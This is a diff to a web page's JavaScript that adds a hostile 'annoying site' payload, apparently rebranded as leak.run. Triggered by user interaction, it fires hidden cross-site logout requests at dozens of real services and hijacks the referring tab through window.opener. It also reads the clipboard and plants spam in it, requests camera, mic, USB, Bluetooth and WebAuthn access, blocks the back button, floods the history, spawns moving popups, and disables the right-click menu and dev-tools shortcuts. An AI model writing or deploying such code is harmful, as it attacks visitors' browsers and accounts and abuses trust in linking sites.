+  'LEAK IS GOD LEAK IS GOD LEAK IS GOD LEAK IS GOD LEAK IS GOD LEAK IS GOD LEAK IS GOD ',
+  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz'
+]
+
+
+const LOGOUT_SITES = {
+  AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
+  'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
+  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
+  Blogger: ['GET', 'https://www.blogger.com/logout.g'],
+  Delicious: ['GET', 'https://www.delicious.com/logout'], // works!
+  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
+  DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
+  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
+  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
+  Gandi: ['GET', 'https://www.gandi.net/login/out'],
+  GitHub: ['GET', 'https://github.com/logout'],
+  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
+  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
+  Hulu: ['GET', 'https://secure.hulu.com/logout'],
+  Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
+  Linode: ['GET', 'https://manager.linode.com/session/logout'],
+  LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
+  MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
+  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
+  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
+  Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
+  Photobucket: ['GET', 'https://photobucket.com/logout'],
+  Skype: ['GET', 'https://secure.skype.com/account/logout'],
+  Slashdot: ['GET', 'https://slashdot.org/my/logout'],
+  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
+  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
+  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
+  ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
+  Threadless: ['GET', 'https://www.threadless.com/logout'],
+  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
+  Vimeo: ['GET', 'https://vimeo.com/log_out'],
+  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
+  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
+  Woot: ['GET', 'https://account.woot.com/logout'],
+  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
 }
 
-function closePopup() {
-    document.getElementById("popup").style.display = "none";
-}
+/**
+ * Array to store the child windows spawned by this window.
+ */
+const wins = []
 
-// Popup'ı tıklamayla kapatma
-window.onclick = function(event) {
-    if (event.target == document.getElementById("popup")) {
-        closePopup();
+/**
+ * Count of number of clicks
+ */
+let interactionCount = 0
+
+/**
+ * Number of iframes injected into the page for the "super logout" functionality.
+ * See superLogout().
+ */
+let numSuperLogoutIframes = 0
+
+/**
+ * Is this window a child window? A window is a child window if there exists a
+ * parent window (i.e. the window was opened by another window so `window.opener`
+ * is set) *AND* that parent is a window on the same origin (i.e. the window was
+ * opened by us, not an external website)
+ */
+const isChildWindow = (window.opener && isParentSameOrigin()) ||
+  window.location.search.indexOf('child=true') !== -1
+
+/**
+ * Is this window a parent window?
+ */
+const isParentWindow = !isChildWindow
+
+/*
+ * Run this code in all windows, *both* child and parent windows.
+ */
+init()
+
+/*
+ * Use `window.opener` to detect if this window was opened by another window, which
+ * will be its parent. The `window.opener` variable is a reference to the parent
+ * window.
+ */
+if (isChildWindow) initChildWindow()
+else initParentWindow()
+
+/**
+ * Initialization code for *both* parent and child windows.
+ */
+function init () {
+  confirmPageUnload()
+
+  interceptUserInput(event => {
+    interactionCount += 1
+
+    // Prevent default behavior (breaks closing window shortcuts)
+    event.preventDefault()
+    event.stopPropagation()
+
+    // 'touchstart' and 'touchend' events are not able to open a new window
+    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
+    // a clever way to exclude touch events.
+    if (event.which !== 0) openWindow()
+
+    startVibrateInterval()
+    enablePictureInPicture()
+    triggerFileDownload()
+
+    focusWindows()
+    copySpamToClipboard()
+    speak()
+    startTheramin()
+
+    // Capture key presses on the Command or Control keys, to interfere with the
+    // "Close Window" shortcut.
+    if (event.key === 'Meta' || event.key === 'Control') {
+      window.print()
+      requestWebauthnAttestation()
+      window.print()
+      requestWebauthnAttestation()
+      window.print()
+      requestWebauthnAttestation()
+    } else {
+      requestPointerLock()
+
+      requestFullscreen()
+      requestClipboardRead()
+      requestMidiAccess()
+      requestBluetoothAccess()
+      requestUsbAccess()
+      requestSerialAccess()
+      requestHidAccess()
+      requestCameraAndMic()
+      if (Math.random() < 0.1) {
+        // Don't request TouchID on every interaction in Safari since it blocks
+        // the event loop and stops windows from moving
+        requestWebauthnAttestation()
+      }
     }
+  })
+}
+
+/**
+ * Initialization code for child windows.
+ */
+function initChildWindow () {
+  registerProtocolHandlers()
+  hideCursor()
+  moveWindowBounce()
+  setupFollowWindow()
+  startVideo()
+  detectWindowClose()
+  triggerFileDownload()
+  speak()
+  rainbowThemeColor()
+  animateUrlWithEmojis()
+
+  interceptUserInput(event => {
+    if (interactionCount === 1) {
+      startAlertInterval()
+    }
+  })
+}
+
+/**
+ * Initialization code for parent windows.
+ */
+function initParentWindow () {
+  showHelloMessage()
+  blockBackButton()
+  fillHistory()
+  startInvisiblePictureInPictureVideo()
+
+  interceptUserInput(event => {
+    // Only run these on the first interaction
+    if (interactionCount === 1) {
+      registerProtocolHandlers()
+      attemptToTakeoverReferrerWindow()
+      hideCursor()
+      startVideo()
+      startAlertInterval()
+      superLogout()
+      removeHelloMessage()
+      rainbowThemeColor()
+      animateUrlWithEmojis()
+      speak('That was a mistake')
+    }
+  })
+}
+
+/**
+ * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
+ * link in a new window. For example, Messenger.com from Facebook does this.
+ * However, that means that `window.opener` will be set, which allows us to redirect
+ * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
+ * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
+ */
+function attemptToTakeoverReferrerWindow () {
+  if (isParentWindow && window.opener && !isParentSameOrigin()) {
+    window.opener.location = `${window.location.origin}/?child=true`
+  }
+}
+
+/**
+ * Returns true if the parent window is on the same origin. It's not enough to check
+ * that `window.opener` is set, because that will also get set if a site on a
+ * different origin links to theannoyingsite.com with `target='_blank'`.
+ */
+function isParentSameOrigin () {
+  try {
+    // May throw an exception if `window.opener` is on another origin
+    return window.opener.location.origin === window.location.origin
+  } catch (err) {
+    return false
+  }
+}
+
+/**
+ * Ask the user "are you sure you want to leave this page?". In most browsers,
+ * this will not actually do anything unless the user has at least one interaction
+ * with the page before they close it.
+ */
+function confirmPageUnload () {
+  window.addEventListener('beforeunload', event => {
+    speak('Please don\'t go!')
+    event.returnValue = true
+  })
+}
+
+/**
+ * Attempt to register all possible browser-whitelisted protocols to be handled by
+ * this web app instead of their default handlers.
+ */
+function registerProtocolHandlers () {
+  if (typeof navigator.registerProtocolHandler !== 'function') return
+
+  const protocolWhitelist = [
+    'bitcoin',
+    'geo',
+    'im',
+    'irc',
+    'ircs',
+    'magnet',
+    'mailto',
+    'mms',
+    'news',
+    'ircs',
+    'nntp',
+    'sip',
+    'sms',
+    'smsto',
+    'ssh',
+    'tel',
+    'urn',
+    'webcal',
+    'wtai',
+    'xmpp'
+  ]
+
+  const handlerUrl = window.location.href + '/url=%s'
+
+  protocolWhitelist.forEach(proto => {
+    navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
+  })
+}
+
+/**
+ * Attempt to access the user's camera and microphone, and attempt to enable the
+ * torch (i.e. camera flash) if the device has one.
+ */
+function requestCameraAndMic () {
+  if (!navigator.mediaDevices ||
+      typeof navigator.mediaDevices.getUserMedia !== 'function') {
+    return
+  }
+
+  navigator.mediaDevices.enumerateDevices().then(devices => {
+    const cameras = devices.filter((device) => device.kind === 'videoinput')
+
+    if (cameras.length === 0) return
+    const camera = cameras[cameras.length - 1]
+
+    navigator.mediaDevices.getUserMedia({
+      deviceId: camera.deviceId,
+      facingMode: ['user', 'environment'],
+      audio: true,
+      video: true
+    }).then(stream => {
+      const track = stream.getVideoTracks()[0]
+      const imageCapture = new window.ImageCapture(track)
+
+      imageCapture.getPhotoCapabilities().then(() => {
+        // Let there be light!
+        track.applyConstraints({ advanced: [{ torch: true }] })
+      }, () => { /* No torch on this device */ })
+    }, () => { /* ignore errors */ })
+  })
+}
+
+/**
+ * Animating the URL with emojis
+ * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
+ */
+function animateUrlWithEmojis () {
+  if (window.ApplePaySession) {
+    // Safari doesn't show the full URL anyway, so we can't animate it
+    return
+  }
+  const rand = Math.random()
+  if (rand < 0.33) {
+    animateUrlWithBabies()
+  } else if (rand < 0.67) {
+    animateUrlWithWave()
+  } else {
+    animateUrlWithMoons()
+  }
+
+  function animateUrlWithBabies () {
+    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']
+
+    setInterval(() => {
+      let s = ''
+      let i; let m
+
+      for (i = 0; i < 10; i++) {
+        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
+        s += '👶' + e[m]
+      }
+
+      window.location.hash = s
+    }, 100)
+  }
+
+  function animateUrlWithWave () {
+    setInterval(() => {
+      let i; let n; let s = ''
+
+      for (i = 0; i < 10; i++) {
+        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4
+
+        s += String.fromCharCode(0x2581 + n)
+      }
+
+      window.location.hash = s
+    }, 100)
+  }
+
+  function animateUrlWithMoons () {
+    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
+    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+    let m = 0
+
+    setInterval(() => {
+      let s = ''
+      let x = 0
+
+      if (!m) {
+        while (d[x] === 4) {
+          x++
+        }
+
+        if (x >= d.length) m = 1
+        else {
+          d[x]++
+        }
+      } else {
+        while (d[x] === 0) {
+          x++
+        }
+
+        if (x >= d.length) m = 0
+        else {
+          d[x]++
+
+          if (d[x] === 8) d[x] = 0
+        }
+      }
+
+      d.forEach(function (n) {
+        s += f[n]
+      })
+
+      window.location.hash = s
+    }, 100)
+  }
+}
+
+/**
+ * Lock the user's pointer, without even being in full screen!
+ * Require user-initiated event.
+ */
+function requestPointerLock () {
+  const requestPointerLockApi = (
+    document.body.requestPointerLock ||
+    document.body.webkitRequestPointerLock ||
+    document.body.mozRequestPointerLock ||
+    document.body.msRequestPointerLock
+  )
+
+  requestPointerLockApi.call(document.body)
+}
+
+/**
+ * Start vibrating the device at random intervals, on supported devices.
+ * Requires user-initiated event.
+ */
+function startVibrateInterval () {
+  if (typeof window.navigator.vibrate !== 'function') return
+  setInterval(() => {
+    const duration = Math.floor(Math.random() * 600)
+    window.navigator.vibrate(duration)
+  }, 1000)
+
+  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
+  window.addEventListener('gamepadconnected', (event) => {
+    const gamepad = event.gamepad
+    if (gamepad.vibrationActuator) {
+      setInterval(() => {
+        if (gamepad.connected) {
+          gamepad.vibrationActuator.playEffect('dual-rumble', {
+            duration: Math.floor(Math.random() * 600),
+            strongMagnitude: Math.random(),
+            weakMagnitude: Math.random()
+          })
+        }
+      }, 1000)
+    }
+  })
+}
+
+/**
+ * Intercept all user-initiated events and call the given the function, `onInput`.
+ */
+function interceptUserInput (onInput) {
+  document.body.addEventListener('touchstart', onInput, { passive: false })
+
+  document.body.addEventListener('mousedown', onInput)
+  document.body.addEventListener('mouseup', onInput)
+  document.body.addEventListener('click', onInput)
+
+  document.body.addEventListener('keydown', onInput)
+  document.body.addEventListener('keyup', onInput)
+  document.body.addEventListener('keypress', onInput)
+}
+
+/**
+ * Start an invisible, muted video so we have a one ready to put into
+ * picture-in-picture mode on the first user-interaction.
+ */
+function startInvisiblePictureInPictureVideo () {
+  const video = document.createElement('video')
+  video.src = getRandomArrayEntry(VIDEOS)
+  video.loop = true
+  video.muted = true
+  video.style = HIDDEN_STYLE
+  video.autoplay = true
+  video.play()
+
+  document.body.appendChild(video)
+}
+
+/**
+ * Active Safari's picture-in-picture feature, which let's show a video on the
+ * desktop. Requires user-initiated event.
+ */
+function enablePictureInPicture () {
+  const video = document.querySelector('video')
+  if (document.pictureInPictureEnabled) {
+    video.style = ''
+    video.muted = false
+    video.requestPictureInPicture()
+    video.play()
+  }
+}
+
+/**
+ * Focus all child windows. Requires user-initiated event.
+ */
+function focusWindows () {
+  wins.forEach(win => {
+    if (!win.closed) win.focus()
+  })
+}
+
+/**
+ * Open a new popup window. Requires user-initiated event.
+ */
+function openWindow () {
+  const { x, y } = getRandomCoords()
+  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
+  const win = window.open(window.location.pathname, '', opts)
+
+  // New windows may be blocked by the popup blocker
+  if (!win) return
+  wins.push(win)
+
+  if (wins.length === 2) setupSearchWindow(win)
+}
+
+/**
+ * Hide the user's cursor!
+ */
+function hideCursor () {
+  document.querySelector('html').style = 'cursor: none;'
+}
+
+/**
+ * Trigger a file download immediately. One file download is allowed *without* user
+ * interaction. Further file downloads should happen in response to a user-initiated
+ * event or they will be blocked.
+ */
+function triggerFileDownload () {
+  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
+  const a = document.createElement('a')
+  a.href = fileName
+  a.download = fileName
+  a.click()
+}
+
+/**
+ * Speak the given `phrase` using text-to-speech.
+ */
+function speak (phrase) {
+  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
+  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
+}
+
+/**
+ * Start an annoying theramin that changes pitch and volume depending on
+ * the mouse position. Uses a Web Audio oscillator. Reauires user-initiated
+ * event.
+ * Based on https://github.com/feross/TheAnnoyingSite.com/pull/2
+ */
+function startTheramin () {
+  const audioContext = new AudioContext()
+  const oscillatorNode = audioContext.createOscillator()
+  const gainNode = audioContext.createGain()
+
+  const pitchBase = 50
+  const pitchRange = 4000
+
+  const wave = audioContext.createPeriodicWave(
+    Array(10).fill(0).map((v, i) => Math.cos(i)),
+    Array(10).fill(0).map((v, i) => Math.sin(i))
+  )
+
+  oscillatorNode.setPeriodicWave(wave)
+
+  oscillatorNode.connect(gainNode)
+  gainNode.connect(audioContext.destination)
+
+  oscillatorNode.start(0)
+
+  const oscillator = ({ pitch, volume }) => {
+    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
+    gainNode.gain.value = volume * 0.5
+  }
+
+  document.body.addEventListener('mousemove', event => {
+    const { clientX, clientY } = event
+    const { clientWidth, clientHeight } = document.body
+    const pitch = (clientX - clientWidth / 2) / clientWidth
+    const volume = (clientY - clientHeight / 2) / clientHeight
+    oscillator({ pitch, volume })
+  })
+}
+
+/**
+ * Attempt to read the user's clipboard.
+ * Requires user-initiated event.
+ */
+function requestClipboardRead () {
+  try {
+    navigator.clipboard.readText().then(
+      data => {
+        if (!window.ApplePaySession) {
+          // Don't alert in Safari because it blocks the event loop
+          window.alert("Successfully read data from clipboard: '" + data + "'")
+        }
+      },
+      () => {}
+    )
+  } catch {}
+}
+
+/**
+ * Request Webauthn attestation.
+ * Requires user-initiated event.
+ */
+function requestWebauthnAttestation () {
+  try {
+    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
+    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
+
+    // sample arguments for registration
+    const createCredentialDefaultArgs = {
+      publicKey: {
+      // Relying Party (a.k.a. - Service):
+        rp: {
+          name: 'Acme'
+        },
+
+        // User:
+        user: {
+          id: new Uint8Array(16),
+          name: 'leakluvsyou@leak.run',
+          displayName: 'leakluvsyou'
+        },
+
+        pubKeyCredParams: [{
+          type: 'public-key',
+          alg: -7
+        }],
+
+        attestation: 'direct',
+
+        timeout: 60000,
+
+        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
+          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
+          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
+        ]).buffer
+      }
+    }
+
+    // sample arguments for login
+    const getCredentialDefaultArgs = {
+      publicKey: {
+        timeout: 60000,
+        // allowCredentials: [newCredential] // see below
+        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
+          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
+          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
+        ]).buffer
+      }
+    }
+
+    // register / create a new credential
+    navigator.credentials.create(createCredentialDefaultArgs)
+      .then((cred) => {
+      // normally the credential IDs available for an account would come from a server
+      // but we can just copy them from above...
+        const idList = [{
+          id: cred.rawId,
+          transports: ['usb', 'nfc', 'ble'],
+          type: 'public-key'
+        }]
+        getCredentialDefaultArgs.publicKey.allowCredentials = idList
+        return navigator.credentials.get(getCredentialDefaultArgs)
+      })
+  } catch {}
+}
+
+/**
+ * Request access to MIDI devices.
+ * Requires user-initiated event.
+ */
+function requestMidiAccess () {
+  try {
+    navigator.requestMIDIAccess({
+      sysex: true
+    })
+  } catch {}
+}
+
+/**
+ * Request access to Bluetooth devices.
+ * Requires user-initiated event.
+ */
+function requestBluetoothAccess () {
+  try {
+    navigator.bluetooth.requestDevice({
+      // filters: [...] <- Prefer filters to save energy & show relevant devices.
+      // acceptAllDevices here ensures dialog can populate, we don't care with what.
+      acceptAllDevices: true
+    })
+      .then(device => device.gatt.connect())
+  } catch {}
+}
+
+/**
+ * Request access to USB devices.
+ * Requires user-initiated event.
+ */
+function requestUsbAccess () {
+  try {
+    navigator.usb.requestDevice({ filters: [{}] })
+  } catch {}
+}
+
+/**
+ * Request access to Serial devices.
+ * Requires user-initiated event.
+ */
+function requestSerialAccess () {
+  try {
+    navigator.serial.requestPort({ filters: [] })
+  } catch {}
+}
+
+/**
+ * Request access to HID devices.
+ * Requires user-initiated event.
+ */
+function requestHidAccess () {
+  try {
+    navigator.hid.requestDevice({ filters: [] })
+  } catch {}
+}
+
+/**
+ * Move the window around the screen and bounce off of the screen edges.
+ */
+function moveWindowBounce () {
+  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
+  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
+
+  setInterval(() => {
+    const x = window.screenX
+    const y = window.screenY
+    const width = window.outerWidth
+    const height = window.outerHeight
+
+    if (x < MARGIN) vx = Math.abs(vx)
+    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
+    if (y < TOP_MARGIN) vy = Math.abs(vy)
+    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
+
+    window.moveBy(vx, vy)
+  }, TICK_LENGTH)
+}
+
+/**
+ * Follow the user's mouse
+ */
+function setupFollowWindow () {
+  document.addEventListener('mousemove', function (e) {
+    window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2))
+  })
+}
+
+/**
+ * Show a random troll video in the window.
+ */
+function startVideo () {
+  const video = document.createElement('video')
+
+  video.src = getRandomArrayEntry(VIDEOS)
+  video.autoplay = true
+  video.loop = true
+  video.style = 'width: 100%; height: 100%;'
+
+  document.body.appendChild(video)
+}
+
+/**
+ * When a child window closes, notify the parent window so it can remove it from
+ * the list of child windows.
+ */
+function detectWindowClose () {
+  window.addEventListener('unload', () => {
+    if (!window.opener.closed) window.opener.onCloseWindow(window)
+  })
+}
+
+/**
+ * Handle a child window closing.
+ */
+function onCloseWindow (win) {
+  const i = wins.indexOf(win)
+  if (i >= 0) wins.splice(i, 1)
+}
+
+/**
+ * Show the unsuspecting user a friendly hello message with a cat.
+ */
+function showHelloMessage () {
+  const template = document.querySelector('template')
+  const clone = document.importNode(template.content, true)
+  document.body.appendChild(clone)
+}
+
+/**
+ * Remove the hello message.
+ */
+function removeHelloMessage () {
+  const helloMessage = document.querySelector('.hello-message')
+  helloMessage.remove()
+}
+
+/**
+ * Change the theme color of the browser in a loop.
+ */
+function rainbowThemeColor () {
+  function zeroFill (width, number, pad = '0') {
+    width -= number.toString().length
+    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
+    return number + ''
+  }
+
+  const meta = document.querySelector('meta.theme-color')
+  setInterval(() => {
+    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
+  }, 50)
+}
+
+/**
+ * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
+ */
+function copySpamToClipboard () {
+  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://leak.run'
+  clipboardCopy(randomArt)
+}
+
+/**
+ * Copy given text, `text`, onto the user's clipboard.
+ * Requires user-initiated event.
+ */
+function clipboardCopy (text) {
+  // A <span> contains the text to copy
+  const span = document.createElement('span')
+  span.textContent = text
+  span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines
+
+  // An <iframe> isolates the <span> from the page's styles
+  const iframe = document.createElement('iframe')
+  iframe.sandbox = 'allow-same-origin'
+  document.body.appendChild(iframe)
+
+  let win = iframe.contentWindow
+  win.document.body.appendChild(span)
+
+  let selection = win.getSelection()
+
+  // Firefox fails to get a selection from <iframe> window, so fallback
+  if (!selection) {
+    win = window
+    selection = win.getSelection()
+    document.body.appendChild(span)
+  }
+
+  const range = win.document.createRange()
+  selection.removeAllRanges()
+  range.selectNode(span)
+  selection.addRange(range)
+
+  let success = false
+  try {
+    success = win.document.execCommand('copy')
+  } catch (err) {
+    console.log(err)
+  }
+
+  selection.removeAllRanges()
+  span.remove()
+  iframe.remove()
+
+  return success
+}
+
+/**
+ * Show a modal dialog at a regular interval. Modals capture focus from other OS apps and browser tabs.
+ * Except in Chrome 64+, where modals can only capture focus from other OS apps,
+ * but not from other tabs.
+ */
+function startAlertInterval () {
+  setInterval(() => {
+    if (Math.random() < 0.5) {
+      showAlert()
+    } else {
+      window.print()
+    }
+  }, 120_000)
+}
+
+/**
+ * Show an alert with 1000's of lines of cat ASCII art.
+ */
+function showAlert () {
+  const randomArt = getRandomArrayEntry(ART)
+  const longAlertText = Array(200).join(randomArt)
+  window.alert(longAlertText)
+}
+
+/**
+ * Fullscreen the browser window
+ */
+function requestFullscreen () {
+  const requestFullscreen = Element.prototype.requestFullscreen ||
+    Element.prototype.webkitRequestFullscreen ||
+    Element.prototype.mozRequestFullScreen ||
+    Element.prototype.msRequestFullscreen
+
+  requestFullscreen.call(document.body)
+}
+
+/**
+ * Log the user out of top sites they're logged into, including Google.com.
+ * Inspired by https://superlogout.com
+ */
+function superLogout () {
+  function cleanup (el, delayCleanup) {
+    if (delayCleanup) {
+      delayCleanup = false
+      return
+    }
+    el.parentNode.removeChild(el)
+  }
+
+  function get (url) {
+    const img = document.createElement('img')
+    img.onload = () => cleanup(img)
+    img.onerror = () => cleanup(img)
+    img.style = HIDDEN_STYLE
+    document.body.appendChild(img)
+    img.src = url
+  }
+
+  function post (url, params) {
+    const iframe = document.createElement('iframe')
+    iframe.style = HIDDEN_STYLE
+    iframe.name = 'iframe' + numSuperLogoutIframes
+    document.body.appendChild(iframe)
+
+    numSuperLogoutIframes += 1
+
+    const form = document.createElement('form')
+    form.style = HIDDEN_STYLE
+
+    let numLoads = 0
+    iframe.onload = iframe.onerror = () => {
+      if (numLoads >= 1) cleanup(iframe)
+      numLoads += 1
+    }
+    form.action = url
+    form.method = 'POST'
+    form.target = iframe.name
+
+    for (const param in params) {
+      if (Object.prototype.hasOwnProperty.call(params, param)) {
+        const input = document.createElement('input')
+        input.type = 'hidden'
+        input.name = param
+        input.value = params[param]
+        form.appendChild(input)
+      }
+    }
+
+    document.body.appendChild(form)
+    form.submit()
+  }
+  for (const name in LOGOUT_SITES) {
+    const method = LOGOUT_SITES[name][0]
+    const url = LOGOUT_SITES[name][1]
+    const params = LOGOUT_SITES[name][2] || {}
+
+    if (method === 'GET') {
+      get(url)
+    } else {
+      post(url, params)
+    }
+
+    const div = document.createElement('div')
+    div.innerText = `Logging you out from ${name}...`
+
+    const logoutMessages = document.querySelector('.logout-messages')
+    logoutMessages.appendChild(div)
+  }
+}
+
+/**
+ * Disable the back button. If the user goes back, send them one page forward ;-)
+ */
+function blockBackButton () {
+  window.addEventListener('popstate', () => {
+    window.history.forward()
+  })
+}
+
+/**
+ * Fill the history with extra entries for this site, to make it harder to find
+ * the previous site in the back button's dropdown menu.
+ */
+function fillHistory () {
+  for (let i = 1; i < 20; i++) {
+    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
+  }
+  // Set location back to the initial location, so user does not notice
+  window.history.pushState({}, '', window.location.pathname)
+}
+
+/**
+ * Get random x, y coordinates for a new window on the screen. Takes into account
+ * screen size, window size, and leaves a safe margin on all sides.
+ */
+function getRandomCoords () {
+  const x = MARGIN +
+    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
+  const y = TOP_MARGIN +
+    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN))
+  return { x, y }
+}
+
+/**
+ * Get a random element from a given array, `arr`.
+ */
+function getRandomArrayEntry (arr) {
+  return arr[Math.floor(Math.random() * arr.length)]
+}
+
+// TODO: document this
+function setupSearchWindow (win) {
+  if (!win) return
+  const { x, y } = getRandomCoords()
+  win.moveTo(x, y)
+  win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
+  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
+  let searchIndex = 1
+  const interval = setInterval(() => {
+    if (win.closed) {
+      clearInterval(interval)
+      onCloseWindow(win)
+      return
+    }
+
+    win.window.location = window.location.pathname
+    setTimeout(() => {
+      win.resizeTo(WIN_WIDTH, WIN_HEIGHT)
+    }, 500)
+    setTimeout(() => {
+      const { x, y } = getRandomCoords()
+      win.moveTo(x, y)
+      win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
+      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
+
+      searchIndex += 1
+      if (searchIndex >= SEARCHES.length) {
+        searchIndex = 0
+      }
+    }, 1000)
+  }, 3000)
+}
+
+function detectBrowser () {
+  const userAgent = navigator.userAgent
+  if (/samsungbrowser\//i.test(userAgent)) {
+    return 'samsung'
+  } else if (/edg\//i.test(userAgent)) {
+    return 'edge'
+  } else if (/edga\//i.test(userAgent)) {
+    return 'edge'
+  } else if (/opt\//i.test(userAgent)) {
+    // Opera iOS
+    return 'opera'
+  } else if (/opr\//i.test(userAgent)) {
+    // Opera Android
+    return 'opera'
+  } else if (/chrome\//i.test(userAgent)) {
+    return 'chrome'
+  } else if (/safari\//i.test(userAgent)) {
+    return 'safari'
+  } else if (/firefox\//i.test(userAgent)) {
+    return 'firefox'
+  }
 }
 
 </script>
 <script>
-  document.addEventListener('DOMContentLoaded', (event) => {
-           let keys = ['s', 'p', 'i', 'n', 'o', 'z', 'a'];
-           let userInput = [];
 
-           document.addEventListener('keydown', function(e) {
-               const key = e.key.toLowerCase();
-               userInput.push(key);
-               if (userInput.length > keys.length) {
-                   userInput.shift();
-               }
-               if (userInput.join('') === keys.join('')) {
-                   window.location.href = 'https://spinoza.wtf';
-               }
-           });
-       });
-
-       window.onload = function () {
+    window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
-
+    
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
-
+    
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
-
+    
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
-
+    
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
-
+    
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
@@ -916,5 +1355,5 @@ window.onclick = function(event) {
               return false;
           }
       }
-
-</script>
+    
+    </script>
